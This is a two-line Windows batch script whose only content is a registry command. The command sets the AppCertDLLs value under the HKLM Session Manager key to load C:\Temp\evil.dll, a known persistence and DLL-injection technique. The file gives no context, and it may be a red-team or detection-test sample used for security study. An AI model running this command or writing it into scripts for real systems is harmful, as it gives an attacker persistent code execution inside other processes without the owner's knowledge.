@echo off
reg add "HKLM\System\CurrentControlSet\Control\Session Manager" /v AppCertDLLs /t REG_SZ /d C:\Temp\evil.dll /f